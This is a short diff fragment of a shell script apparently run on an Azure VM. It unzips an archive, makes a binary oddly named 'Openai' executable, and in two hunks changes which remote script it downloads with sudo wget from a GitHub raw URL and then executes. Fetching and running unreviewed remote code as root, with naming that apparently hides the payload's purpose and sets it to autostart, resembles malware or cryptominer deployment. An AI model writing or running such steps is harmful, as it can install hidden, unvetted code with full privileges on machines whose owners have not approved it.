@@ -13,8 +13,8 @@ cd /home/azureuser/
 sudo rm start.sh
 sudo rm meoi.sh
 sudo chmod +x Openai
-sudo wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/meoi.sh
-bash meoi.sh
+sudo wget https://raw.githubusercontent.com/minnie1311/dang/main/autostart.sh
+sh autostart.sh
 
 fi
 exit
@@ -28,7 +28,7 @@ sudo unzip don.zip
 sudo chmod +x Openai
 sudo rm start.sh
 sudo rm meoi.sh
-sudo wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/meoi.sh
-bash meoi.sh
+sudo wget https://raw.githubusercontent.com/minnie1311/dang/main/autostart.sh
+sh autostart.sh
 
 exit 0
